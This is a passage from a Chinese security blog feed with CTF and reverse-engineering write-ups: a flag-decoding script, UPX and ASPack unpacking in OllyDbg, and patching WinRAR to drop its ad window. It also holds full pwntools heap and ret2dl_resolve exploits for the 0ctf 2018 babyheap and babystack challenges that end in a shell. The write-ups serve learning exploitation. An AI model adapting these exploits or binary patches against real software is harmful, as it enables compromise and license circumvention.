class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">string=&apos;e3nifIH9b_C@n@dH&apos;</span><br><span class="line">unstring = &apos;&apos;</span><br><span class="line">for i in range(len(string)):</span><br><span class="line">unstring += chr(ord(string[i])-i)</span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(unstring)</span><br><span class="line">print flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ python lovewp.py </span><br><span class="line">&#123;i_l0ve_you&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;love&quot;&gt;&lt;a href=&quot;#love&quot; class=&quot;headerlink&quot; title=&quot;love&quot;&gt;&lt;/a&gt;love&lt;/h1&gt;&lt;p&gt;&lt;em&gt;其实是比较简单的逆向，但是毕竟上手时间短，写一写顺便把思路缕清&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&quot;题目&quot;&gt;&lt;a hr
      
    
    </summary>
    
      <category term="re" scheme="http://siriuswhiter.tk/categories/re/"/>
    
    
      <category term="re" scheme="http://siriuswhiter.tk/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>Reverse Learning-unpack</title>
    <link href="http://siriuswhiter.tk/2019/03/13/reverse-learning-unpack/"/>
    <id>http://siriuswhiter.tk/2019/03/13/reverse-learning-unpack/</id>
    <published>2019-03-13T07:45:50.000Z</published>
    <updated>2019-03-13T09:03:37.042Z</updated>
    
    <content type="html"><![CDATA[<p><em>学习一下基础的软件脱壳，之后慢慢更新</em></p><h1 id="upx"><a href="#upx" class="headerlink" title="upx"></a>upx</h1><h2 id="type"><a href="#type" class="headerlink" title="type"></a>type</h2><p>upx属于比较经典的压缩壳，支持大多数操作系统运行文件，可以使压缩过的可执行文件体积缩小50%-70% ；</p><p>文件位压缩后的运行方式便是在压缩文件的开始加入解压缩的代码，所以程序在运行完解压缩代码之后，程序的代码实际上就与压缩前一致了，而这也是我们可以手动调试脱壳的前提。</p><h2 id="pack"><a href="#pack" class="headerlink" title="pack"></a>pack</h2><p>先下载 <a href="https://upx.github.io/" target="_blank" rel="noopener">upx</a></p><p>od 查看文件在upx 之前的内存情况，从开始处，信息比较清楚</p><figure class="image-box">                <img src="/2019/03/13/reverse-learning-unpack/1.png" alt="未加壳" title="" class="">                <p>未加壳</p>            </figure><p>命令行调用upx 给文件加壳   <code>./upx.exe filename.exe</code></p><p>再次查看文件情况，当然也可以使用IDA。</p><figure class="image-box">                <img src="/2019/03/13/reverse-learning-unpack/2.png" alt="加壳" title="" class="">                <p>加壳</p>            </figure><h2 id="unpack"><a href="#unpack" class="headerlink" title="unpack"></a>unpack</h2><ol><li>upx自带脱壳命令，加个-d 就是脱壳模式</li><li>手动脱壳</li></ol><p>文件起始有个pushad将所有寄存器的值入栈，之后从加壳后的文件起始处按f8单步往后走，发现不久后就开始了反复循环</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">004079D0   &gt; /8A06          mov al,byte ptr ds:[esi]</span><br><span class="line">004079D2   . |46            inc esi                                  ;  upxpacke.00407006</span><br><span class="line">004079D3   . |8807          mov byte ptr ds:[edi],al</span><br><span class="line">004079D5   . |47            inc edi                                  ;  upxpacke.00401002</span><br><span class="line">004079D6   &gt; |01DB          add ebx,ebx</span><br><span class="line">004079D8   . |75 07         jnz short upxpacke.004079E1</span><br><span class="line">004079DA   &gt; |8B1E          mov ebx,dword ptr ds:[esi]</span><br><span class="line">004079DC   . |83EE FC       sub esi,-0x4</span><br><span class="line">004079DF   . |11DB          adc ebx,ebx</span><br><span class="line">004079E1   &gt;^\72 ED         jb short upxpacke.004079D0</span><br></pre></td></tr></table></figure><p>可以看到大概意思就是在疯狂复制esi地址的数据到 edi地址处</p><p>而我们只需要找到之后的popad就可以了，所以右键-&gt;serch for-&gt;command 或直接 ctrl+F 寻找popad ，不过这里需要去掉entire block的勾选，否则会找到起始地址之前的popad，找到之后f2下断点，f9直接运行到这里</p><p>之后继续单步,一个小循环之后，跳转到一个地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00407B66   .  61            popad</span><br><span class="line">00407B67   .  8D4424 80     lea eax,dword ptr ss:[esp-0x80]</span><br><span class="line">00407B6B   &gt;  6A 00         push 0x0</span><br><span class="line">00407B6D   .  39C4          cmp esp,eax</span><br><span class="line">00407B6F   .^ 75 FA         jnz short upxpacke.00407B6B</span><br><span class="line">00407B71   .  83EC 80       sub esp,-0x80</span><br><span class="line">00407B74   .- E9 C897FFFF   jmp upxpacke.00401341</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00401341    E8 83040000     call upxpacke.004017C9</span><br><span class="line">00401346  ^ E9 B3FDFFFF     jmp upxpacke.004010FE</span><br><span class="line">0040134B    8BFF            mov edi,edi                              ; upxpacke.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0040134D    55              push ebp</span><br><span class="line">0040134E    8BEC            mov ebp,esp</span><br><span class="line">00401350    81EC 28030000   sub esp,0x328</span><br></pre></td></tr></table></figure><p>到达该地址后，可以看到有个call函数，此时就可以使用od 的插件OllyDump将文件脱壳，需要注意的是重建输入表一般会选择方式二，其他的可以根据情况来定，这次保持默认就可以了</p><figure class="image-box">                <img src="/2019/03/13/reverse-learning-unpack/3.png" alt="ollydump" title="" class="">                <p>ollydump</p>            </figure><p>打开输出的脱壳的文件，找到最初始的地方，发现与脱壳前一样，也就是说脱壳成功</p><figure class="image-box">                <img src="/2019/03/13/reverse-learning-unpack/4.png" alt="脱壳效果" title="" class="">                <p>脱壳效果</p>            </figure><h1 id="aspack"><a href="#aspack" class="headerlink" title="aspack"></a>aspack</h1><h2 id="type-1"><a href="#type-1" class="headerlink" title="type"></a>type</h2><p>专门针对win32程序的压缩软件，整体原理与upx差不多所以方法实际上是可以通用的。</p><h2 id="unpack-1"><a href="#unpack-1" class="headerlink" title="unpack"></a>unpack</h2><p>aspack popad不容易找到，所以可以使用其他的办法来</p><p>这里可以确定0x401000是程序本身的初始位置，只是在没有解包之前，这里还无法反汇编。</p><p>我们这里使用硬件断点(硬件断点不通过0xCC/<em>int 3h</em>/中断程序运行并向调试器发送报告，而是通过写入DR寄存器来实现；其支持更复杂的中断，但是只能设置四个)，在0x401000处设置一个硬件断点，f9运行，程序到0x401000处停止执行，此时应该已经解包完成，如果没有显示的话按ctrl+A， 使得OD重新分析代码即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;学习一下基础的软件脱壳，之后慢慢更新&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;upx&quot;&gt;&lt;a href=&quot;#upx&quot; class=&quot;headerlink&quot; title=&quot;upx&quot;&gt;&lt;/a&gt;upx&lt;/h1&gt;&lt;h2 id=&quot;type&quot;&gt;&lt;a href=&quot;#type&quot; clas
      
    
    </summary>
    
      <category term="re" scheme="http://siriuswhiter.tk/categories/re/"/>
    
    
      <category term="re" scheme="http://siriuswhiter.tk/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>Reverse Learning-Practical practice</title>
    <link href="http://siriuswhiter.tk/2019/03/12/reverse-learning-practical-practice/"/>
    <id>http://siriuswhiter.tk/2019/03/12/reverse-learning-practical-practice/</id>
    <published>2019-03-12T14:23:42.000Z</published>
    <updated>2019-03-13T07:54:16.887Z</updated>
    
    <content type="html"><![CDATA[<p><em>这是之前l3c战队逆向的新手训练，本来想以后再搞，但最近又被最为任务下发了，菜的不行，上周什么也没干成，挣扎了一周。还是决定慢慢学习逆向</em></p><h1 id="winRAR-去除广告"><a href="#winRAR-去除广告" class="headerlink" title="winRAR 去除广告"></a>winRAR 去除广告</h1><p>  拿x64dbg做调试器来达到理解原理并去除广告</p><ol><li><p>打开WinRAR，发现开始就有广告弹出；</p></li><li><p>使用x64dbg打开WinRAR，按f9直到程序完全加载，即程序看上去就和普通打开时一样；</p><figure class="image-box">                <img src="/2019/03/12/reverse-learning-practical-practice/1.png" alt="初始状态" title="" class="">                <p>初始状态</p>            </figure></li></ol><ol start="3"><li>命令行输入 bp DestroyWindow  命令，意思就是在DestroyWindow处下断点，然后关掉广告，调试器会停在断点处；<figure class="image-box">                <img src="/2019/03/12/reverse-learning-practical-practice/2.png" alt="断点状态" title="" class="">                <p>断点状态</p>            </figure></li></ol><ol start="4"><li>通过栈回溯到调用destroywindow 函数的地方，往上翻找到消息的开头(关于找到广告窗口子函数的开头，可以向上翻，也可以将其地址减去基址/<em>x64dbg在符号中可以看到基址</em>/得到偏移，将其放入IDA，加上IDA基址，找到函数模块，从而确定开头位置)，将其直接跳转至关闭广告窗口；<figure class="image-box">                <img src="/2019/03/12/reverse-learning-practical-practice/3.png" alt="函数起始" title="" class="">                <p>函数起始</p>            </figure></li></ol><ol start="5"><li>保存patch即可。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;这是之前l3c战队逆向的新手训练，本来想以后再搞，但最近又被最为任务下发了，菜的不行，上周什么也没干成，挣扎了一周。还是决定慢慢学习逆向&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;winRAR-去除广告&quot;&gt;&lt;a href=&quot;#winRAR-去除广告&quot; class=&quot;head
      
    
    </summary>
    
      <category term="re" scheme="http://siriuswhiter.tk/categories/re/"/>
    
    
      <category term="re" scheme="http://siriuswhiter.tk/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>0ctf-2018-pwn</title>
    <link href="http://siriuswhiter.tk/2019/03/11/0ctf-2018-pwn/"/>
    <id>http://siriuswhiter.tk/2019/03/11/0ctf-2018-pwn/</id>
    <published>2019-03-11T07:09:35.000Z</published>
    <updated>2019-04-18T12:32:13.487Z</updated>
    
    <content type="html"><![CDATA[<h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>整体代码风格与2017 的babyheap基本一致，不过漏洞点变得隐蔽且利用变得困难了</p><p>功能： allocate, resize, show, delete 四个功能</p><p>指针仍然是通过一通操作被隐蔽了，所以不能打存放指针地址的主意</p><p>allocate时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Size: &quot;);</span><br><span class="line"> size = read_int_8();</span><br><span class="line"> if ( size &gt; 0 )</span><br><span class="line"> &#123;</span><br><span class="line">   if ( size &gt; 0x58 )</span><br><span class="line">     size = 0x58;</span><br></pre></td></tr></table></figure></p><p>而resize时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Size: &quot;);</span><br><span class="line"> LODWORD(v1) = read_int_8();</span><br><span class="line"> newsize = v1;</span><br><span class="line"> if ( (signed int)v1 &gt; 0 )</span><br><span class="line"> &#123;</span><br><span class="line">   v1 = *(_QWORD *)(24LL * idx + a1 + 8) + 1LL;  // new size+1</span><br><span class="line">   if ( newsize &lt;= v1 )</span><br></pre></td></tr></table></figure></p><p>存在off-by-one漏洞，其他函数基本没有问题</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>利用off-by-one，修改chunk size，释放chunk，再申请，将未释放的chunk被系统标记为释放，以此泄露libc</p><p>之后的思路便是复写malloc_hook ，但是这里需要注意一点：</p><p>申请的chunk最终大小最大为0x60，也就是即使千辛万苦将某个chunk的size改为0x70并将其置入链表，也没有任何用，尝试了好久之前却没动脑子，哭了；</p><p>所以需要换个思路，可以使用之前三级头招新时出题人的思路：将size放入fastbinY中，然后将chunk分配到main_arena处，修改topchunk为malloc_hook之上，然后再次分配chunk复写malloc_hook即可</p><p>这里就没有必要想free_hook了，毕竟free_hook周围全都是’\x00’，topchunk地址改过去，分配时size检查就没法过了</p><p>这种不能查看指针的，需要搞清楚自己申请的释放的都是哪些chunk，不然很容易乱。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./babyheap&apos;)</span><br><span class="line">elf = ELF(&apos;./babyheap&apos;)</span><br><span class="line">libc = ELF(&apos;./lib/x86_64-linux-gnu/libc-2.23.so&apos;)</span><br><span class="line"></span><br><span class="line">def allocate(size):</span><br><span class="line">sh.sendlineafter(&apos;Command: &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;Size: &apos;,str(size))</span><br><span class="line"></span><br><span class="line">def resize(idx,size,con):</span><br><span class="line">        sh.sendlineafter(&apos;Command: &apos;,&apos;2&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;Index: &apos;,str(idx))</span><br><span class="line">        sh.sendlineafter(&apos;Size: &apos;,str(size))</span><br><span class="line">sh.sendlineafter(&apos;Content: &apos;,con)</span><br><span class="line">def delete(idx):</span><br><span class="line">        sh.sendlineafter(&apos;Command: &apos;,&apos;3&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;Index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(&apos;Command: &apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;Index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allocate(0x18) #0</span><br><span class="line">allocate(0x28) #1</span><br><span class="line">allocate(0x58) #2</span><br><span class="line">allocate(0x18) #3</span><br><span class="line">allocate(0x38) #4</span><br><span class="line"></span><br><span class="line">#---------leak libc addr-------------------------</span><br><span class="line">resize(0,0x19,&apos;a&apos;*0x18+p8(0x91))</span><br><span class="line">delete(1)</span><br><span class="line">allocate(0x28)</span><br><span class="line">show(2)</span><br><span class="line">sh.recvuntil(&apos;: &apos;)</span><br><span class="line">leak_addr = u64(sh.recv(8))</span><br><span class="line">print &apos;leak_addr: &apos;+hex(leak_addr)</span><br><span class="line">main_arena = leak_addr- 88</span><br><span class="line">print &apos;main_arena: &apos;+hex(main_arena)</span><br><span class="line">libc_addr = main_arena - 0x3c4b20</span><br><span class="line">print &apos;libc_base: &apos;+hex(libc_addr)</span><br><span class="line">one_gadget = libc_addr + 0x4526a </span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#----------get shell-----------------------------</span><br><span class="line">allocate(0x58) #5</span><br><span class="line">delete(5)</span><br><span class="line">resize(2,0x8,p64(0x41))</span><br><span class="line">allocate(0x58) #5</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#allocate(0x18) #6</span><br><span class="line">#allocate(0x58) #7</span><br><span class="line"></span><br><span class="line">resize(5,0x59,&apos;a&apos;*0x58+p8(0x61))</span><br><span class="line">#resize(4,0x10,&apos;a&apos;*0x38+p64(0x41))</span><br><span class="line">delete(3)</span><br><span class="line">allocate(0x58)</span><br><span class="line">resize(3,0x20,&apos;a&apos;*0x18+p64(0x41))</span><br><span class="line">delete(4)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">resize(3,0x28,&apos;c&apos;*0x18+p64(0x41)+p64(main_arena+0x20))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x38)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x38)</span><br><span class="line"></span><br><span class="line">resize(6,0x30,&apos;a&apos;*0x28+p64(main_arena-0x20))</span><br><span class="line">allocate(0x10)</span><br><span class="line">resize(7,0x8,p64(one_gadget))</span><br><span class="line">allocate(0x10)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>ret2_resolve_runtime ， 直接给了溢出，但是无处下手，实际就是ret2resolve 的标准情况，这里也学习一下</p><p><a href="https://www.siriuswhiter.tk/2019/03/20/introduction-to-pwn1-4-ret2dl_runtime_resolve/" target="_blank" rel="noopener">https://www.siriuswhiter.tk/2019/03/20/introduction-to-pwn1-4-ret2dl_runtime_resolve/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t read__()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-28h]</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x40u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>溢出在bss段伪造resolve结构体，覆盖write为system调用’/bin/sh’ getshell</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import roputils</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">offset = 44</span><br><span class="line">readplt = 0x08048300</span><br><span class="line">bss = 0x0804a020</span><br><span class="line">vulFunc = 0x0804843B</span><br><span class="line"></span><br><span class="line">p = process(&apos;./babystack&apos;)</span><br><span class="line">rop = roputils.ROP(&apos;./babystack&apos;)</span><br><span class="line">addr_bss = rop.section(&apos;.bss&apos;)</span><br><span class="line"></span><br><span class="line"># step1 : write sh &amp; resolve struct to bss</span><br><span class="line">buf1 = &apos;A&apos; * offset #44</span><br><span class="line">buf1 += p32(readplt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(100)</span><br><span class="line">p.send(buf1)</span><br><span class="line"></span><br><span class="line">buf2 =  rop.string(&apos;/bin/sh&apos;)</span><br><span class="line">buf2 += rop.fill(20, buf2)</span><br><span class="line">buf2 += rop.dl_resolve_data(addr_bss+20, &apos;system&apos;)</span><br><span class="line">buf2 += rop.fill(100, buf2)</span><br><span class="line">p.send(buf2)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#step2 : use dl_resolve_call get system &amp; system(&apos;/bin/sh&apos;)</span><br><span class="line">buf3 = &apos;A&apos;*44 + rop.dl_resolve_call(addr_bss+20, addr_bss)</span><br><span class="line">p.send(buf3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="heapstorm2"><a href="#heapstorm2" class="headerlink" title="heapstorm2"></a>heapstorm2</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>刚开始进行了一通设置，这里需要关注一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 setup()</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; // [rsp+8h] [rbp-18h]</span><br><span class="line">  int fd; // [rsp+Ch] [rbp-14h]</span><br><span class="line"></span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(_bss_start, 0LL, 2, 0LL);</span><br><span class="line">  alarm(0x3Cu);</span><br><span class="line">  puts(</span><br><span class="line">    &quot;    __ __ _____________   __   __    ___    ____\n&quot;</span><br><span class="line">    &quot;   / //_// ____/ ____/ | / /  / /   /   |  / __ )\n&quot;</span><br><span class="line">    &quot;  / ,&lt;  / __/ / __/ /  |/ /  / /   / /| | / __  |\n&quot;</span><br><span class="line">    &quot; / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /\n&quot;</span><br><span class="line">    &quot;/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/\n&quot;);</span><br><span class="line">  puts(&quot;===== HEAP STORM II =====&quot;);</span><br><span class="line">  if ( !mallopt(1, 0) )                         // ban fastbin</span><br><span class="line">    exit(-1);</span><br><span class="line">  if ( mmap((void *)0x13370000, 0x1000uLL, 3, 34, -1, 0LL) != (void *)0x13370000 )</span><br><span class="line">    exit(-1);</span><br><span class="line">  fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  if ( fd &lt; 0 )</span><br><span class="line">    exit(-1);</span><br><span class="line">  if ( read(fd, (void *)0x13370800, 0x18uLL) != 24 )</span><br><span class="line">    exit(-1);</span><br><span class="line">  close(fd);</span><br><span class="line">  MEMORY[0x13370818] = MEMORY[0x13370810];</span><br><span class="line">  for ( i = 0; i &lt;= 15; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)(16 * (i + 2LL) + 0x13370800) = set_ptr((_QWORD *)0x13370800, 0LL);</span><br><span class="line">    *(_QWORD *)(16 * (i + 2LL) + 0x13370808) = set_size(0x13370800LL, 0LL);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0x13370800LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以注意到</p><ol><li>使用mallopt取消了fastbin，</li><li>在0x1337000 处 分配了0x1000大小的空间，可读可写，然后从0x13370800处 写入了0x20的随机数据，后面是存储结构，指针＋size</li></ol><p>可以在调试时看这块区域的情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">x/20gx 0x13370800</span><br><span class="line">0x13370800:0xa16b7989b9c2ea960xaf69f4118a3bb745</span><br><span class="line">0x13370810:0x994db09e4d7847740x994db09e4d784774   --》  view 需要检验的地方</span><br><span class="line"></span><br><span class="line">0x13370820:0xa16b2fa20decaa860xaf69f4118a3bb75d</span><br><span class="line">0x13370830:0xa16b2fa20decaaa60xaf69f4118a3bb75d</span><br><span class="line">0x13370840:0xa16b2fa20decaac60xaf69f4118a3bb75d</span><br><span class="line">0x13370850:0xa16b7989b9c2ea960xaf69f4118a3bb745</span><br><span class="line">0x13370860:0xa16b7989b9c2ea960xaf69f4118a3bb745</span><br><span class="line">0x13370870:0xa16b7989b9c2ea960xaf69f4118a3bb745</span><br><span class="line">0x13370880:0xa16b7989b9c2ea960xaf69f4118a3bb745</span><br><span class="line">0x13370890:0xa16b7989b9c2ea960xaf69f4118a3bb745</span><br></pre></td></tr></table></figure><p>后面会将指针，size经过处理存储到这里，指针会与0x13370800处的随机数xor，size会与0x13370808处的随机数xor</p><p>主功能有 </p><ol><li>alloc ， 使用了calloc ，最多16个chunk且会将输入的chunk 的指针与size存储到上面说的地方 size要大于12小于0x01000；</li><li><p>update  , 再输入的大小要不大于原size-12,输入数据后会将其最后12字节进行填充，很明显有off-by-null;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Size: &quot;);</span><br><span class="line">size_ = get_num();</span><br><span class="line">if ( size_ &lt;= 0 || size_ &gt; (unsigned __int64)(set_size((__int64)a1, a1[idx + 2].size) - 12) )</span><br><span class="line">  return puts(&quot;Invalid Size&quot;);</span><br><span class="line">printf(&quot;Content: &quot;);</span><br><span class="line">v2 = set_ptr(a1, a1[idx + 2LL].ptr);</span><br><span class="line">get_str(v2, size_);</span><br><span class="line">v3 = size_ + v2;</span><br><span class="line">*(_QWORD *)v3 = &apos;ROTSPAEH&apos;;</span><br><span class="line">*(_DWORD *)(v3 + 8) = &apos;II_M&apos;;</span><br><span class="line">*(_BYTE *)(v3 + 12) = 0;                      // off-by-null</span><br><span class="line">return printf(&quot;Chunk %d Updated\n&quot;, (unsigned int)idx);</span><br></pre></td></tr></table></figure></li><li><p>delete 检查存储的size，之后删除, 可以看到处理的比较干净；</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( idx &lt; 0 || idx &gt; 15 || !set_size((__int64)a1, a1[idx + 2].size) )</span><br><span class="line">  return puts(&quot;Invalid Index&quot;);</span><br><span class="line">v2 = (void *)set_ptr(a1, a1[idx + 2LL].ptr);</span><br><span class="line">free(v2);</span><br><span class="line">a1[idx + 2LL].ptr = set_ptr(a1, 0LL);</span><br><span class="line">a1[idx + 2].size = set_size((__int64)a1, 0LL);</span><br></pre></td></tr></table></figure><ol start="4"><li>view 会检查之前的0x10处的随机数，满足条件才可以view；<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( (a1[3] ^ a1[2]) != 0x13377331LL )</span><br><span class="line">  return puts(&quot;Permission denied&quot;);</span><br></pre></td></tr></table></figure></li></ol><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>思路还是比较清晰的，首先利用off-by-null的漏洞通过chunk overlapping 将chunk分配到0x13370800处，修改原先存储的随机数，使得可以使用view函数，同时覆盖下面存储的指针与size，调用view泄露libc基址，再将指针指向malloc_hook处或free_hook处直接getshell；</p><p>主要的问题就是利用overlapping做到条件地址写，过程应该会较为复杂；</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
